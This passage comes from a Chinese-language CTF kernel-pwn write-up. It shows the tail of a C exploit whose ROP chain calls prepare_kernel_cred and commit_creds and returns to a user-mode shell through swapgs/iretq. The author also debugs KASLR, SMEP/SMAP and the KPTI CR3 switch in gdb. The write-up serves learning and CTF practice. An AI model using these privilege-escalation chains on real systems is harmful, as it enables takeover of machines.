    <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">prepare_kernel_cred</span><span class="p">;</span>
    <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">mov_rdi_rax</span><span class="p">;</span>
    <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">commit_creds</span><span class="p">;</span>
    <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">swapgs_restore_regs_and_return_to_usermode</span><span class="p">;</span>
    <span class="c1">//data[i++] = swapgs;</span>
    <span class="c1">//data[i++] = iretq;</span>
    <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">shell_addr</span><span class="p">;</span>
    <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_cs</span><span class="p">;</span>
    <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rflags</span><span class="p">;</span>
    <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_sp</span><span class="p">;</span>
    <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_ss</span><span class="p">;</span>


    <span class="n">encrypt_cu</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mh">0x300</span><span class="p">);</span>

    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">edit</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>

    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">gift</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>


<span class="p">}</span>

<span class="k">extern</span> <span class="kt">void</span> <span class="nf">_start</span><span class="p">(){</span>
    <span class="n">doMain</span><span class="p">();</span>
    <span class="n">syscall64</span><span class="p">(</span><span class="mi">60</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<h3 id="问题及感想1"><span class="me-2">问题及感想1</span><a href="#问题及感想1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ul>
  <li>​<code class="language-plaintext highlighter-rouge">vmlinux-to-elf</code>​ 获取 kernel elf 后，用 checksec 检测保护, PIE 是关闭的</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918004946-1pg1nvl.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918004946-1pg1nvl.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>但是呢， <code class="language-plaintext highlighter-rouge">qemu-system-x86_64</code>​ 启动时 时开启 地址随机化的</li>
</ul>

<p>‍</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918005045-q8oxh9a.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918005045-q8oxh9a.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>然后后面调试的时候就很怪,没有符号表</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918005357-kr2qcyv.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918005357-kr2qcyv.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>网上搜了一下，发现可以在 <code class="language-plaintext highlighter-rouge">target</code>​ 前使使用 <code class="language-plaintext highlighter-rouge">add-symbol-file</code>​ 重新定位地址</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918005620-1qe5xrh.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918005620-1qe5xrh.png" alt="image" loading="lazy"></a>​</p>

<ul>
  <li>然后符号表就有了</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918005647-sylkmuv.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918005647-sylkmuv.png" alt="image" loading="lazy"></a>​</p>

<ul>
  <li>但还是有点小问题比如…</li>
</ul>

<p>直接 tel 看 地址还是 noPIE 的地址，然后就很玄学</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918005750-r9edywa.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918005750-r9edywa.png" alt="image" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918005832-259i2cf.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918005832-259i2cf.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="c">#add-symbol-file ./vmlinux &lt;新基地址&gt;</span>

<span class="nb">cat</span> /proc/kallsyms | <span class="nb">grep </span>startup_64


add-symbol-file ./vmlinux 

<span class="nb">set</span> <span class="nv">$base</span><span class="o">=</span>0x-0xffffffff81000000

</pre></td></tr></tbody></table></code></div></div>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240917131718-5j338bb.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240917131718-5j338bb.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<h3 id="问题及感想2-调试调废了这个问题未完成待续"><span class="me-2">问题及感想2 （调试调废了，这个问题未完成，待续）</span><a href="#问题及感想2-调试调废了这个问题未完成待续" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>问题出在这里， 用这种方式返回也会态后，无法执行执行代码，会直接 gg</p>

<p>‍</p>

<ul>
  <li>rop 是这样的</li>
</ul>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">canary</span><span class="p">;</span>
<span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rdi</span><span class="p">;</span>
<span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">prepare_kernel_cred</span><span class="p">;</span>
<span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">mov_rdi_rax</span><span class="p">;</span>
<span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">commit_creds</span><span class="p">;</span>
<span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">swapgs</span><span class="p">;</span>	<span class="c1">// swapgs; retn</span>
<span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">iretq</span><span class="p">;</span>	<span class="c1">// iretq; retn</span>
<span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">shell_addr</span><span class="p">;</span>
<span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_cs</span><span class="p">;</span>
<span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rflags</span><span class="p">;</span>
<span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_sp</span><span class="p">;</span>
<span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_ss</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>对照一下 shellcode</li>
</ul>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="n">asm</span> <span class="k">volatile</span> <span class="p">(</span>
    <span class="s">"push user_ss;"</span>
    <span class="s">"push user_sp;"</span>
    <span class="s">"push user_rflags;"</span>
    <span class="s">"push user_cs;"</span>
    <span class="s">"push shell_addr;"</span>
    <span class="s">"swapgs;"</span>
    <span class="s">"iretq;"</span>
<span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>然后动态调试一下</li>
</ul>

<p>‍</p>

<p>‍</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918192233-1xva6ab.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918192233-1xva6ab.png" alt="image" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918192304-sk45h95.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918192304-sk45h95.png" alt="image" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918192404-uz3oy02.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918192404-uz3oy02.png" alt="image" loading="lazy"></a>​</p>

<ul>
  <li>然后再单步走，就直接gg了, 段错误,</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918192451-7kbaz81.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918192451-7kbaz81.png" alt="image" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918192521-jw8k97n.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918192521-jw8k97n.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<div class="language-prolog highlighter-rouge"><div class="code-header">
        <span data-label-text="Prolog"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="p">[</span>   <span class="mf">48.590572</span><span class="p">][</span>  <span class="nv">T134</span><span class="p">]</span> <span class="ss">exploit</span><span class="p">[</span><span class="m">134</span><span class="p">]</span><span class="o">:</span> <span class="ss">segfault</span> <span class="ss">at</span> <span class="m">401635</span> <span class="ss">ip</span> <span class="m">0000000000401635</span> <span class="ss">sp</span> <span class="m">00007</span><span class="ss">ffd8490f528</span> <span class="ss">error</span> <span class="m">15</span> <span class="ss">in</span> <span class="ss">exploit</span><span class="p">[</span><span class="m">401000</span><span class="o">+</span><span class="m">1000</span><span class="p">]</span>
<span class="p">[</span>   <span class="mf">48.596286</span><span class="p">][</span>  <span class="nv">T134</span><span class="p">]</span> <span class="nv">Code</span><span class="o">:</span> <span class="m">00</span> <span class="m">8</span><span class="ss">c</span> <span class="m">14</span> <span class="m">25</span> <span class="m">28</span> <span class="m">40</span> <span class="m">40</span> <span class="m">00</span> <span class="m">48</span> <span class="m">89</span> <span class="m">24</span> <span class="m">25</span> <span class="m">38</span> <span class="m">40</span> <span class="m">40</span> <span class="m">00</span> <span class="m">9</span><span class="ss">c</span> <span class="m">8</span><span class="ss">f</span> <span class="m">04</span> <span class="m">25</span> <span class="m">30</span> <span class="m">40</span> <span class="m">40</span> <span class="m">00</span> <span class="m">48</span> <span class="m">8</span><span class="ss">d</span> <span class="m">05</span> <span class="ss">fe</span> <span class="m">09</span> <span class="m">00</span> <span class="m">00</span> <span class="m">48</span> <span class="m">89</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<ul>
  <li>通过上面的段错误 我感觉可能是 <code class="language-plaintext highlighter-rouge">+smep,+smap</code>​ 保护的原因吧</li>
  <li>下面就调试一下正常情况下，kernel 态 到用户态的过程</li>
</ul>

<p>‍</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>swapgs_restore_regs_and_return_to_usermode
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>swapgs_restore_regs_and_return_to_usermode 汇编代码</li>
</ul>

<pre><code class="language-x86asm">pwndbg&gt; x/54i 0xffffffffa2c00000 + 0xc00ff0
   0xffffffffa3800ff0 &lt;swapgs_restore_regs_and_return_to_usermode&gt;:     jmp    0xffffffffa380100b &lt;swapgs_restore_regs_and_return_to_usermode+27&gt;
   0xffffffffa3800ff2 &lt;swapgs_restore_regs_and_return_to_usermode+2&gt;:   mov    ecx,0x48
   0xffffffffa3800ff7 &lt;swapgs_restore_regs_and_return_to_usermode+7&gt;:   mov    rdx,QWORD PTR gs:0x17bc8
   0xffffffffa3801000 &lt;swapgs_restore_regs_and_return_to_usermode+16&gt;:  and    edx,0xfffffffe
   0xffffffffa3801003 &lt;swapgs_restore_regs_and_return_to_usermode+19&gt;:  mov    eax,edx
   0xffffffffa3801005 &lt;swapgs_restore_regs_and_return_to_usermode+21&gt;:  shr    rdx,0x20
   0xffffffffa3801009 &lt;swapgs_restore_regs_and_return_to_usermode+25&gt;:  wrmsr
   0xffffffffa380100b &lt;swapgs_restore_regs_and_return_to_usermode+27&gt;:  nop    DWORD PTR [rax+rax*1+0x0] 
   0xffffffffa3801010 &lt;swapgs_restore_regs_and_return_to_usermode+32&gt;:  pop    r15	; 恢复用户态的寄存器?
   0xffffffffa3801012 &lt;swapgs_restore_regs_and_return_to_usermode+34&gt;:  pop    r14
   0xffffffffa3801014 &lt;swapgs_restore_regs_and_return_to_usermode+36&gt;:  pop    r13
   0xffffffffa3801016 &lt;swapgs_restore_regs_and_return_to_usermode+38&gt;:  pop    r12
   0xffffffffa3801018 &lt;swapgs_restore_regs_and_return_to_usermode+40&gt;:  pop    rbp
   0xffffffffa3801019 &lt;swapgs_restore_regs_and_return_to_usermode+41&gt;:  pop    rbx
   0xffffffffa380101a &lt;swapgs_restore_regs_and_return_to_usermode+42&gt;:  pop    r11
   0xffffffffa380101c &lt;swapgs_restore_regs_and_return_to_usermode+44&gt;:  pop    r10
   0xffffffffa380101e &lt;swapgs_restore_regs_and_return_to_usermode+46&gt;:  pop    r9
   0xffffffffa3801020 &lt;swapgs_restore_regs_and_return_to_usermode+48&gt;:  pop    r8
   0xffffffffa3801022 &lt;swapgs_restore_regs_and_return_to_usermode+50&gt;:  pop    rax
   0xffffffffa3801023 &lt;swapgs_restore_regs_and_return_to_usermode+51&gt;:  pop    rcx
   0xffffffffa3801024 &lt;swapgs_restore_regs_and_return_to_usermode+52&gt;:  pop    rdx
   0xffffffffa3801025 &lt;swapgs_restore_regs_and_return_to_usermode+53&gt;:  pop    rsi
   0xffffffffa3801026 &lt;swapgs_restore_regs_and_return_to_usermode+54&gt;:  mov    rdi,rsp ; exp 是跳到这里然后执行的  ; rsp 赋值给 rdi
   0xffffffffa3801029 &lt;swapgs_restore_regs_and_return_to_usermode+57&gt;:  mov    rsp,QWORD PTR gs:0x6004	; 不知道
   0xffffffffa3801032 &lt;swapgs_restore_regs_and_return_to_usermode+66&gt;:  push   QWORD PTR [rdi+0x30]		; user status
   0xffffffffa3801035 &lt;swapgs_restore_regs_and_return_to_usermode+69&gt;:  push   QWORD PTR [rdi+0x28]
   0xffffffffa3801038 &lt;swapgs_restore_regs_and_return_to_usermode+72&gt;:  push   QWORD PTR [rdi+0x20]
   0xffffffffa380103b &lt;swapgs_restore_regs_and_return_to_usermode+75&gt;:  push   QWORD PTR [rdi+0x18]
   0xffffffffa380103e &lt;swapgs_restore_regs_and_return_to_usermode+78&gt;:  push   QWORD PTR [rdi+0x10]
   0xffffffffa3801041 &lt;swapgs_restore_regs_and_return_to_usermode+81&gt;:  push   QWORD PTR [rdi]
   0xffffffffa3801043 &lt;swapgs_restore_regs_and_return_to_usermode+83&gt;:  push   rax
   0xffffffffa3801044 &lt;swapgs_restore_regs_and_return_to_usermode+84&gt;:  xchg   ax,ax
   0xffffffffa3801046 &lt;swapgs_restore_regs_and_return_to_usermode+86&gt;:  mov    rdi,cr3	; 这里 取出 cr3
   0xffffffffa3801049 &lt;swapgs_restore_regs_and_return_to_usermode+89&gt;:  jmp    0xffffffffa380107f &lt;swapgs_restore_regs_and_return_to_usermode+143&gt;
   0xffffffffa380104b &lt;swapgs_restore_regs_and_return_to_usermode+91&gt;:  mov    rax,rdi
   0xffffffffa380104e &lt;swapgs_restore_regs_and_return_to_usermode+94&gt;:  and    rdi,0x7ff
   0xffffffffa3801055 &lt;swapgs_restore_regs_and_return_to_usermode+101&gt;: bt     QWORD PTR gs:0x2b756,rdi
   0xffffffffa380105f &lt;swapgs_restore_regs_and_return_to_usermode+111&gt;: jae    0xffffffffa3801070 &lt;swapgs_restore_regs_and_return_to_usermode+128&gt;
   0xffffffffa3801061 &lt;swapgs_restore_regs_and_return_to_usermode+113&gt;: btr    QWORD PTR gs:0x2b756,rdi
   0xffffffffa380106b &lt;swapgs_restore_regs_and_return_to_usermode+123&gt;: mov    rdi,rax
   0xffffffffa380106e &lt;swapgs_restore_regs_and_return_to_usermode+126&gt;: jmp    0xffffffffa3801078 &lt;swapgs_restore_regs_and_return_to_usermode+136&gt;
   0xffffffffa3801070 &lt;swapgs_restore_regs_and_return_to_usermode+128&gt;: mov    rdi,rax
   0xffffffffa3801073 &lt;swapgs_restore_regs_and_return_to_usermode+131&gt;: bts    rdi,0x3f
   0xffffffffa3801078 &lt;swapgs_restore_regs_and_return_to_usermode+136&gt;: or     rdi,0x800
   0xffffffffa380107f &lt;swapgs_restore_regs_and_return_to_usermode+143&gt;: or     rdi,0x1000	; 然后jmp 到这里了
   0xffffffffa3801086 &lt;swapgs_restore_regs_and_return_to_usermode+150&gt;: mov    cr3,rdi
   0xffffffffa3801089 &lt;swapgs_restore_regs_and_return_to_usermode+153&gt;: pop    rax
   0xffffffffa380108a &lt;swapgs_restore_regs_and_return_to_usermode+154&gt;: pop    rdi
   0xffffffffa380108b &lt;swapgs_restore_regs_and_return_to_usermode+155&gt;: swapgs
   0xffffffffa380108e &lt;swapgs_restore_regs_and_return_to_usermode+158&gt;: jmp    0xffffffffa38010c0 &lt;native_iret&gt;
   0xffffffffa3801093 &lt;swapgs_restore_regs_and_return_to_usermode+163&gt;: nop
</code></pre>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918193816-4byie0o.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918193816-4byie0o.png" alt="image" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918194159-dep32yz.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918194159-dep32yz.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<ul>
  <li>exp</li>
</ul>

<p>‍</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918210038-md0xpqc.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918210038-md0xpqc.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918210118-xkbnbwo.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918210118-xkbnbwo.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918210155-699jz7q.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918210155-699jz7q.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918210233-cw72tcz.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240918210233-cw72tcz.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<ul>
  <li>大概就是 修改里一个 cr3 寄存器的值，然后返回用户态</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>0x3052000 -&gt; 0x3053000
cr3 <span class="o">=</span> cr3 | 0x1000 <span class="c"># = 0x3053000</span>
然后
swapgs
iretq
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<ul>
  <li>下面我尝试手动修改cr3 的值</li>
</ul>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">canary</span><span class="p">;</span>
<span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rdi</span><span class="p">;</span>
<span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">prepare_kernel_cred</span><span class="p">;</span>
<span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">mov_rdi_rax</span><span class="p">;</span>
<span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">commit_creds</span><span class="p">;</span>
<span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">swapgs</span><span class="p">;</span>	<span class="c1">// swapgs; retn</span>
<span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">iretq</span><span class="p">;</span>	<span class="c1">// iretq; retn 执行到这里时 gdb 手动修改 cr3寄存器的值为0x3053000，然后再继续返回到用户态，看看能不能正常执行</span>
<span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">shell_addr</span><span class="p">;</span>
<span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_cs</span><span class="p">;</span>
<span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rflags</span><span class="p">;</span>
<span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_sp</span><span class="p">;</span>
<span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_ss</span><span class="p">;</span>

</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>执行到 swapgs 后,我们查看 cr3 寄存器的值，发现和上面的不一样，然后多试了几次，才知道 cr3 的值每次都是不一样的，但是 <code class="language-plaintext highlighter-rouge">or 0x1000</code>​ 操作应该是固定的吧，我们就手动计算修改试试看</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240919001934-vl3t67j.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240919001934-vl3t67j.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="o">&gt;&gt;&gt;</span> <span class="nf">hex</span><span class="p">(</span><span class="mh">0x307e000</span><span class="o">|</span><span class="mh">0x1000</span><span class="p">)</span>
<span class="sh">'</span><span class="s">0x307f000</span><span class="sh">'</span>
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>
    <p>不能直接 <code class="language-plaintext highlighter-rouge">set $cr3=0x307f000</code>​ ,奇怪</p>
  </li>
  <li>
    <p>但是这样就可以了哈哈， 然后就更奇怪了，修改后强行run 就 crush 了，</p>
  </li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240919003208-53mgsyb.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240919003208-53mgsyb.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<h2 id="kylin_driver"><span class="me-2">Kylin_Driver</span><a href="#kylin_driver" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>‍</p>

<h3 id="保护及init-1"><span class="me-2">保护及init</span><a href="#保护及init-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ul>
  <li>开启了 kaslr kerenl 地址随机化</li>
  <li>然后是 <code class="language-plaintext highlighter-rouge">+smep + smap</code>​,</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240919122231-g5115ka.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240919122231-g5115ka.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>默认看不了地址</li>
</ul>

